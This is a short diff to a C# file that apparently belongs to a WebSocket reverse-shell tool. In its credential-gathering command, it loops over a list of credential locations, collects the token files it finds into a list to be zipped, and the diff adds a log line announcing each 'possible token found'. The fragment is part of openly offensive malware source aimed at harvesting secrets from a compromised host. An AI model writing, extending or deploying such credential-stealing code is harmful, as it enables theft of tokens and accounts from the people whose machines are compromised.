@@ -53,7 +53,7 @@ namespace WebSocketReverseShellDotNet.service.commands
                     Constants.LIST_OF_CRED_LOCATIONS[i], destDir, i );
                 if (!string.IsNullOrWhiteSpace(tokenFile))
                 {
-
+                    sb.AppendLine($"[+] Possible token found: {Constants.LIST_OF_CRED_LOCATIONS[i]}");
                     listOfFilesToZip.Add(tokenFile);
                 }
 
